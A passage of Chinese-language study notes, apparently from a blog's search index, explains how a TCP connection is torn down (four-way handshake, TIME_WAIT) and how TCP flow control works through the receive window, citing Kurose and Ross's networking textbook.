<li>客户端 TCP 收到 FIN 报文段后，会向服务器端 TCP 发送一个 <strong>ACK 报文段</strong>。<br>发送此 ACK 报文段后，客户端 TCP 将进入 <strong>TIME_WAIT</strong> 状态，服务器端 TCP 收到 ACK 报文段后将进入 CLOSED 状态。<br>假定此 ACK 丢失，TIME_WAIT 状态使 TCP 客户重传最后的确认报文。<br>在 TIME_WAIT 状态中所消耗的时间是与具体实现有关的，而典型的值是 30 秒、1 分钟或 2 分钟。<br>经过等待后，连接就正式关闭，客户端所有资源（包括端口号）将被释放。</li>
</ol>
<p>为了关闭该连接，在两台主机之间发送了 4 个分组，由于这个原因，这种连接关闭过程通常被称为 <strong>4 次挥手</strong>。</p>
<p>总结以上，TCP 连接的组成包括：一台主机上的缓存（发送缓存和接收缓存）、变量和与进程连接的套接字，以及另一台主机上的另一组缓存、变量和与进程连接的套接字。</p>
<h2 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h2><p>TCP 为它的应用程序提供了<strong>流量控制服务</strong>（flow-control service）以消除发送方使接收方缓存溢出的可能性。流量控制因此是一个速度匹配服务，即发送方的发送速率与接收方应用程序的读取速率相匹配。即使流量控制和拥塞控制采取的动作非常相似（对发送方的遏制），但是它们显然是针对完全不同的原因而采取的措施。</p>
<p>TCP 通过让 <em>发送方</em> 维护一个称为<strong>接收窗口</strong>（receive window）的变量来提供流量控制。通俗地说，接收窗口用于给发送方一个提示 —— 该接收方还有多少可用的缓存空间。因为 TCP 是全双工通信，在连接两端的发送方都各自维护一个接收窗口。</p>
<p>假定主机 A 通过一条 TCP 连接向主机 B 发送一个大文件，定义以下变量：</p>
<ul>
<li>RcvBuffer：主机 B 的接收缓存大小</li>
<li>LastByteRead：主机 B 上的应用进程从缓存读出的数据流的最后一个字节的编号</li>
<li>LastByteRcvd：从网络中到达的并且已放入主机 B 接收缓存中的数据流的最后一个字节的编号</li>
</ul>
<p>由于 TCP 不允许已分配的缓存溢出，下式必须成立：</p>
<p>$$LastByteRcvd-LastByteRead\leq RcvBuffer$$</p>
<p>接收窗口用 rwnd 表示，根据缓存可用空间的数量来设置：</p>
<p>$$rwnd = RcvBuffer-(LastByteRcvd-LastByteRead)$$</p>
<p>由于该空间是随着时间变化的，所以 rwnd 是动态的。</p>
<p>主机 B 通过把当前的 rwnd 值放入它发给主机 A 的报文段接收窗口字段中，通知主机 A 它在该连接的缓存中还有多少可用空间。开始时，主机 B 设定 $rwnd = RcvBuffer$。注意到为了实现这一点，主机 B 必须跟踪几个与连接有关的变量。</p>
<p>主机 A 轮流跟踪两个变量，LastByteSent 和 LastByteAcked，注意到这两个变量之间的差 $LastByteSent-LastByteAcked$，就是主机 A 发送到连接中但未被确认的数据量。通过将未被确认的数据量控制在值 rwnd 以内，就可以保证主机 A 不会使主机 B 的接收缓存溢出。因此，主机 A 在该连接的整个生命周期须保证：</p>
<p>$$LastByteSent-LastByteAcked\leq rwnd$$</p>
<p>特别的，TCP 规范中要求：当主机 B 的接收窗口为 0 时，主机 A 继续发送只有一个字节数据的报文段。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://book.douban.com/subject/30280001/">James F. Kurose,Keith W. Ross.计算机网络：自顶向下方法[M].北京:机械工业出版社,2018:134-185.</a></li>
</ol>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
</search>
